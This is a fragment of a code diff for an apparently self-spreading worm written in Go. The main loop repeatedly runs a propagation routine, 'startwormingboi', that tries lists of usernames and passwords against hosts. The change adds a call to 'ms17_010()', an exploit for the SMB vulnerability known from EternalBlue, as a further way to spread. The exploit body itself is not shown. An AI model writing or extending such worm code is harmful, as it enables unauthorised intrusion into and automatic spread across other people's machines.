@@ -38,6 +38,7 @@ func main(){
 	startwormingboi(myos)
 	for len(os.Args) == 1{
 		time.Sleep(5 * time.Minute)
+		ms17_010()
 		startwormingboi(myos)
 	}
 }
@@ -62,7 +63,7 @@ func startwormingboi(myos string) {
 				go gettingin(myip, user, passwds, &wg, myos)
 			}
 			wg.Wait()
-	 } 
+} 
 
 func gettingin(myip string, user []string, passwds []string, wg *sync.WaitGroup, myos string ){
 	n := 0
